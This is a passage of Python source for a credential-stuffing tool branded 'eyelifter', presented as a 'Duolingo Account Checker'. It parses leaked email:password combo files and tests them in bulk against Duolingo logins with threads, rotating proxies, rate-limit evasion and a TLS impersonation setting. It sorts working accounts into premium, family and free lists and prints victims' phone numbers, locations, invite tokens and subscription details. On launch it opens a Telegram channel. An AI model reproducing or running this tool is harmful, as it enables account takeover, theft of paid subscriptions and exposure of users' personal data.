    eyelifter_rl_wait(proxy)
    if _EYELIFTER_STOP.is_set():
        if proxy:
            eyelifter_rel_proxy(proxy)
        return
    attempts = _EYELIFTER_CFG.s.get("retries", 2) + 1
    last = None

    try:
        for a in range(attempts):
            if _EYELIFTER_STOP.is_set():
                break
            if a > 0:
                np = eyelifter_pick_proxy(exclude=proxy)
                if np:
                    if proxy and proxy != np:
                        eyelifter_rel_proxy(proxy)
                    proxy = np
                eyelifter_rl_wait(proxy)
                if _EYELIFTER_STOP.is_set():
                    break
                eyelifter_dbg("RETRY", f"{combo} attempt {a + 1}/{attempts}")
            try:
                r = eyelifter_check(combo, proxy)
            except Exception as e:
                r = EyelifterResult(combo.split(":", 1)[0], "")
                r.status = "error"
                r.reason = f"crash_{type(e).__name__}"

            last = r

            if r.status in ("hit", "bad"):
                break

            is_last = a == attempts - 1
            reason = r.reason or ""

            if reason == "rate_limit":
                with _EYELIFTER_LK:
                    _EYELIFTER_ST["rl"] += 1
                if proxy:
                    eyelifter_cool_proxy(proxy, 300)
                w = min(_EYELIFTER_CFG.s.get("rate_limit_delay", 60) * (2 ** a), 300)
                eyelifter_rl_backoff(w, proxy)
                if not proxy:
                    break
                if is_last:
                    break
                if _EYELIFTER_STOP.wait(w * (0.7 + random.random() * 0.6)):
                    break
                continue

            if reason.startswith(("net_", "login_", "profile_")) \
                    or reason in ("no_uid", "no_jwt",
                                  "login_non_json", "profile_non_json"):
                if proxy:
                    eyelifter_bad_proxy(proxy)
                    eyelifter_cool_proxy(proxy, 30)
                if not is_last and _EYELIFTER_STOP.wait(1.0 + random.random()):
                    break
                continue

            break
    finally:
        if proxy:
            eyelifter_rel_proxy(proxy)

    if last is None:
        last = EyelifterResult(combo.split(":", 1)[0], "")
        last.status = "error"
        last.reason = "no_result"

    try:
        eyelifter_record(last)
    except Exception:
        pass


def eyelifter_bulk_run(combos):
    global _EYELIFTER_TOTAL, _EYELIFTER_HANDLES
    eyelifter_reset_stats()
    _EYELIFTER_TOTAL = len(combos)

    d = eyelifter_folder()
    _EYELIFTER_HANDLES = eyelifter_open_files(d)

    threads = _EYELIFTER_CFG.s["threads"]
    eyelifter_log("🚀", "INFO", "START", f"{_EYELIFTER_TOTAL} combos · {threads} threads")

    _EYELIFTER_STOP.clear()
    ex = ThreadPoolExecutor(max_workers=threads)
    inflight = set()

    try:
        cap = max(threads * 4, 100)
        for i in range(0, len(combos), cap):
            if _EYELIFTER_STOP.is_set():
                break
            for c in combos[i:i + cap]:
                if _EYELIFTER_STOP.is_set():
                    break
                inflight.add(ex.submit(eyelifter_run_one, c))
            while len(inflight) >= cap:
                done, inflight = wait(inflight, timeout=0.4,
                                      return_when=FIRST_COMPLETED)
                for f in done:
                    try:
                        f.result(timeout=0.01)
                    except Exception:
                        pass

        while inflight:
            done, inflight = wait(inflight, timeout=0.4,
                                  return_when=FIRST_COMPLETED)
            for f in done:
                try:
                    f.result(timeout=0.01)
                except Exception:
                    pass

    except KeyboardInterrupt:
        _EYELIFTER_STOP.set()
        eyelifter_log("🛑", "WARN", "STOP",
                      "ctrl+c — draining inflight (max 30s)")
        deadline = time.time() + 30
        while inflight and time.time() < deadline:
            try:
                done, inflight = wait(inflight, timeout=1.0,
                                      return_when=FIRST_COMPLETED)
                for f in done:
                    try:
                        f.result(timeout=0.01)
                    except Exception:
                        pass
                remaining = len(inflight)
                if remaining and remaining % 10 == 0:
                    eyelifter_log("⏳", "INFO", "DRAIN",
                                  f"{remaining} inflight remaining")
            except KeyboardInterrupt:
                eyelifter_log("⏳", "WARN", "DRAIN", "second ctrl+c — forcing stop")
                break
    finally:
        _EYELIFTER_STOP.set()
        try:
            ex.shutdown(wait=True, cancel_futures=True)
        except TypeError:
            ex.shutdown(wait=True)

    for fh in _EYELIFTER_HANDLES.values():
        try:
            fh.close()
        except Exception:
            pass

    with _EYELIFTER_LK:
        snap = dict(_EYELIFTER_ST)

    for base, key in (
        ("duolingo_premium.txt", "premium"),
        ("duolingo_family.txt", "family"),
        ("duolingo_free.txt", "free"),
        ("duolingo_bad.txt", "bad"),
        ("duolingo_errors.txt", "errors"),
    ):
        old = os.path.join(d, base)
        new = os.path.join(d, base.replace(".txt", f"_{snap[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    el = time.time() - _EYELIFTER_START
    eyelifter_summary([
        ("Total", _EYELIFTER_TOTAL),
        ("Checked", snap["checked"]),
        ("PREMIUM", snap["premium"]),
        ("FAMILY", snap["family"]),
        ("FREE", snap["free"]),
        ("Bad creds", snap["bad"]),
        ("Errors", snap["errors"]),
        ("Rate limited", snap["rl"]),
        ("Proxy fails", snap["pfails"]),
        ("Time", f"{el:.1f}s"),
        ("Speed", f"{_EYELIFTER_TOTAL / max(el, 0.001):.2f} combo/s"),
        ("Folder", d),
        ("Credit", f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}"),
    ])


_EYELIFTER_COMBO_RX = re.compile(
    r'([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}):([^\s|,;>"\']+)'
)


def eyelifter_extract_combos(content):
    out = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        for m in _EYELIFTER_COMBO_RX.finditer(line):
            email = m.group(1).lower()
            pw = m.group(2)
            if not pw or len(pw) > 200:
                continue
            if pw.startswith(("http://", "https://")):
                continue
            out.add(f"{email}:{pw}")
    return sorted(out)


def eyelifter_ask_threads():
    eyelifter_section("THREADS")
    print(f"  current : {_EYELIFTER_CFG.s['threads']}")
    print(f"  range   : 1-{_EYELIFTER_MAX_THREADS}")
    print("  blank to keep current")
    raw = input(f"{eyelifter_color('96', '[*] threads > ')}").strip()
    if not raw:
        return _EYELIFTER_CFG.s["threads"]
    try:
        t = max(1, min(_EYELIFTER_MAX_THREADS, int(raw)))
    except ValueError:
        return _EYELIFTER_CFG.s["threads"]
    if t != _EYELIFTER_CFG.s["threads"]:
        _EYELIFTER_CFG.s["threads"] = t
        try:
            _EYELIFTER_CFG.eyelifter_save()
        except Exception:
            pass
    return t


def eyelifter_single_check(proxies):
    global _EYELIFTER_POOL, _EYELIFTER_BADP
    _EYELIFTER_STOP.clear()
    eyelifter_section("SINGLE CHECK")
    combo = input(f"{eyelifter_color('96', '[*] email:password > ')}").strip()
    if ":" not in combo:
        eyelifter_log("✗", "ERROR", "INPUT", "invalid")
        return

    proxy = None
    if proxies:
        if not _EYELIFTER_POOL:
            _EYELIFTER_POOL = list(proxies)
            _EYELIFTER_BADP = set()
        proxy = eyelifter_pick_proxy()

    eyelifter_log("🔍", "STEP", "CHECK", combo.split(":")[0])
    t0 = time.time()
    try:
        r = eyelifter_check(combo, proxy)
    except Exception as e:
        eyelifter_log("✗", "ERROR", "CHECK", str(e)[:80])
        return
    el = time.time() - t0

    kind = eyelifter_classify(r)
    eyelifter_section("RESULT")
    code, bold = _EYELIFTER_KIND_COLOR.get(kind, ("0", False))
    print(f"  {eyelifter_color(code, kind.upper(), bold)}")
    rows = [
        ("Email", r.email),
        ("Password", r.password),
        ("UID", r.uid or "-"),
        ("Username", r.username or "-"),
        ("Name", r.name or "-"),
        ("Plan", r.plan_label or "-"),
        ("Plan Tier", r.plan_tier or "-"),
        ("Plan Type", r.plan_type or "-"),
        ("Renewer", r.plan_renewer or "-"),
        ("Has Plus", r.has_plus),
        ("Is Premium", r.is_premium),
        ("Is Family", r.is_family),
        ("Family Seats", r.family_seats or "-"),
        ("Family Owner", r.family_owner or "-"),
        ("Invite Token", r.invite_token or "-"),
        ("Renewing", r.renewing),
        ("Expires", eyelifter_human_ts(r.expires) or "-"),
        ("Price", eyelifter_fmt_price(r.price, r.currency)),
        ("Currency", r.currency or "-"),
        ("Subscriptions", len(r.subscriptions)),
        ("Sub Configs", len(r.subscription_configs)),
        ("Shop Items", len(r.shop_items)),
        ("Plus Discounts", len(r.plus_discounts)),
        ("Streak", r.streak),
        ("Total XP", r.total_xp),
        ("Lingots", r.lingots),
        ("Gems", r.gems),
        ("Learning", r.learning_language or "-"),
        ("From", r.from_language or "-"),
        ("Current Course", r.current_course or "-"),
        ("Created", eyelifter_human_ts(r.creation_ts) or "-"),
        ("Timezone", r.timezone or "-"),
        ("Location", r.location or "-"),
        ("Phone", r.phone or "-"),
        ("Bio", r.bio or "-"),
        ("Has Google", r.has_google),
        ("Has Facebook", r.has_facebook),
        ("Reason", eyelifter_readable_reason(r.reason) if r.reason else "-"),
        ("Time", f"{el:.2f}s"),
        ("Credit", f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}"),
    ]
    wk = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {eyelifter_color('96', str(k).ljust(wk))}  {v}")

    if r.subscriptions:
        print(f"\n  {eyelifter_color('96', 'SUBSCRIPTIONS', True)}")
        for i, s_ in enumerate(r.subscriptions, 1):
            print(f"    [{i}] {s_.get('product')}")
            print(f"        tier={s_.get('tier')} type={s_.get('type')} "
                  f"renewer={s_.get('renewer')}")
            print(f"        renewing={s_.get('renewing')} "
                  f"expires={eyelifter_human_ts(s_.get('expected'))}")
            print(f"        price={eyelifter_fmt_price(s_.get('price'), s_.get('currency'))} "
                  f"period={s_.get('period_months')}mo "
                  f"trial={s_.get('free_trial')}")


def eyelifter_bulk_check(proxies):
    global _EYELIFTER_POOL, _EYELIFTER_BADP
    _EYELIFTER_STOP.clear()
    eyelifter_section("BULK CHECK")
    path = input(f"{eyelifter_color('96', '[*] combo file > ')}").strip()
    if not path or not os.path.isfile(path):
        eyelifter_log("✗", "ERROR", "FILE", "not found")
        return
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    combos = eyelifter_extract_combos(content)
    if not combos:
        eyelifter_log("✗", "ERROR", "EXTRACT", "no valid combos")
        return
    eyelifter_log("✓", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    eyelifter_ask_threads()

    if proxies:
        _EYELIFTER_POOL = list(proxies)
        _EYELIFTER_BADP = set()
        eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} loaded")
    else:
        _EYELIFTER_POOL = []
        _EYELIFTER_BADP = set()
        eyelifter_log("⚠️", "WARN", "PROXY", "direct")

    try:
        eyelifter_bulk_run(combos)
    except KeyboardInterrupt:
        _EYELIFTER_STOP.set()
        eyelifter_log("🛑", "WARN", "STOP", "stopping...")


def eyelifter_settings_menu():
    eyelifter_section("SETTINGS")
    s = _EYELIFTER_CFG.s
    print(f"  [1]  Threads:              {s['threads']} (1-{_EYELIFTER_MAX_THREADS})")
    print(f"  [2]  Timeout:              {s['timeout']}s")
    print(f"  [3]  Retries:              {s['retries']}")
    print(f"  [4]  Combo Delay:          {s['combo_delay']}s")
    print(f"  [5]  Proxies File:         {s['proxies_file']}")
    print(f"  [6]  Rate-limit Delay:     {s['rate_limit_delay']}s")
    print(f"  [7]  Skip Proxy Test:      {s['skip_proxy_test']}")
    print(f"  [8]  Debug:                {s['debug']}")
    print(f"  [9]  Hit Spacer:           {s['hit_spacer']}")
    print(f"  [10] Impersonate:          {s['impersonate']}")
    print(f"  [0]  Back")
    ch = input(f"{eyelifter_color('96', '[*] select > ')}").strip()
    changed = False
    try:
        if ch == "1":
            s["threads"] = max(1, min(_EYELIFTER_MAX_THREADS, int(input("threads: "))))
            changed = True
        elif ch == "2":
            s["timeout"] = max(5, min(120, int(input("timeout: "))))
            changed = True
        elif ch == "3":
            s["retries"] = max(0, min(5, int(input("retries: "))))
            changed = True
        elif ch == "4":
            s["combo_delay"] = max(0.0, min(60.0, float(input("combo delay: "))))
            changed = True
        elif ch == "5":
            v = input("proxies file: ").strip()
            if v:
                s["proxies_file"] = v
                changed = True
        elif ch == "6":
            s["rate_limit_delay"] = max(1, min(300, int(input("rate-limit delay: "))))
            changed = True
        elif ch == "7":
            s["skip_proxy_test"] = not s["skip_proxy_test"]
            changed = True
        elif ch == "8":
            s["debug"] = not s["debug"]
            changed = True
        elif ch == "9":
            s["hit_spacer"] = not s["hit_spacer"]
            changed = True
        elif ch == "10":
            v = input("impersonate: ").strip()
            if v:
                s["impersonate"] = v
                changed = True
        elif ch == "0":
            return
    except (ValueError, TypeError):
        eyelifter_log("✗", "ERROR", "CONFIG", "invalid")
        return
    if changed:
        try:
            _EYELIFTER_CFG.eyelifter_save()
            eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception:
            eyelifter_log("⚠️", "WARN", "CONFIG", "save failed")


def eyelifter_open_channel():
    try:
        import subprocess, shutil
        for cmd in ("termux-open-url", "xdg-open", "open"):
            if shutil.which(cmd):
                subprocess.Popen(
                    [cmd, f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL, start_new_session=True,
                    close_fds=True)
                return
        if os.name == "nt":
            os.startfile(f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}")
            return
        import webbrowser
        webbrowser.open(f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}")
    except Exception:
        pass


def eyelifter_main():
    eyelifter_verify("main")
    if _EYELIFTER_CFG.s.get("open_channel_on_launch", True):
        threading.Thread(target=eyelifter_open_channel, daemon=True).start()

    eyelifter_banner(EYELIFTER_TOOL, "Duolingo Account Checker")
    eyelifter_log("🧬", "INFO", "TLS",
        f"curl_cffi={'on' if _EYELIFTER_HAVE_CFFI else 'off'} · "
        f"impersonate={_EYELIFTER_CFG.s.get('impersonate')}")
    eyelifter_log("📣", "INFO", "CREDIT",
        f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}")
    eyelifter_log("🐛", "INFO", "DEBUG",
        f"{'ON' if _EYELIFTER_CFG.s.get('debug') else 'OFF'}")
    eyelifter_log("⚙️", "INFO", "THREADS",
        f"max={_EYELIFTER_MAX_THREADS} default={_EYELIFTER_CFG.s['threads']}")

    proxy_file = os.path.join(
        os.path.dirname(_EYELIFTER_CFG_PATH),
        _EYELIFTER_CFG.s.get("proxies_file", "proxies.txt"))
    proxies = eyelifter_load_proxies(proxy_file)
    if proxies and not _EYELIFTER_CFG.s.get("skip_proxy_test", False):
        proxies = eyelifter_filter_proxies(proxies)

    while True:
        eyelifter_verify("menu")
        eyelifter_section(f"MAIN MENU · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}")
        if proxies:
            eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies")
        else:
            eyelifter_log("⚠️", "WARN", "PROXY", "direct")
        eyelifter_log("⚙️", "INFO", "THREADS", f"{_EYELIFTER_CFG.s['threads']}")
        print("[1] Single check")
        print("[2] Bulk check")
        print("[3] Settings")
        print("[4] Exit")
        ch = input(f"{eyelifter_color('93', '[*] select > ')}").strip()

        if ch == "1":
            eyelifter_single_check(proxies)
        elif ch == "2":
            _EYELIFTER_STOP.clear()
            eyelifter_bulk_check(proxies)
        elif ch == "3":
            eyelifter_settings_menu()
            proxies = eyelifter_load_proxies(proxy_file)
            if proxies and not _EYELIFTER_CFG.s.get("skip_proxy_test", False):
                proxies = eyelifter_filter_proxies(proxies)
        elif ch == "4":
            print("Exiting...")
            return
        else:
            eyelifter_log("✗", "ERROR", "INPUT", "invalid")


if __name__ == "__main__":
    try:
        eyelifter_main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\n[!] interrupted — exiting clean")
    except RuntimeError as _exc:
        print(f"\n[!] {_exc}")
    except BaseException as _exc:
        print(f"\n[FATAL] {type(_exc).__name__}: {_exc}")